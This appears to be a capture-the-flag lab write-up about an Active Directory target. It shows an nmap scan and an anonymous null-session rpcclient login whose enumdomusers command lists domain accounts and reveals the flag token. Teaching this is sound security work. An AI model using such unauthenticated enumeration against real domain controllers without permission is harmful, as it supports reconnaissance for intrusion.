# AD

So, the token should be somewhere somehow related to an Active Directory service.

Last time we had a look at the registers of a DNS server, inside we can find:

* ad.test.lab.		21600	IN	A	172.16.0.17

and with a previous nmap we had found the following information. I am removing those ports that do not affect us in this case.

```
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Heimdal Kerberos (server time: 2019-05-28 18:19:26Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: TEST)
445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: TEST)
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap     (Anonymous bind OK)
1024/tcp open  msrpc        Microsoft Windows RPC
3268/tcp open  ldap         (Anonymous bind OK)
3269/tcp open  ssl/ldap     (Anonymous bind OK)
```

We can use rpcclient to connect to port 135. Thankfully the server allows for anonymous connections and queries, so we can do the following process to enumerate the domain users.

We simply specify user "", and the IP. The port is not required since it is default.
We set an empty password and then gain access to the commands. Enumerate the domain users with **enumdomusers**, and among them you will find the expected token.

```
sudo rpcclient -U "" 172.16.0.17
Enter WORKGROUP\'s password:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[info] rid:[0x450]
user:[sviridov] rid:[0x452]
user:[sidorov] rid:[0x454]
user:[petrov] rid:[0x456]
user:[lomonosov] rid:[0x457]
user:[token_fopekr0mf] rid:[0x45e]
```

## Info gathering

It is very important we gather all information we get, everytime. In this case, having knowledge of these domain users will prove very useful for further challenges.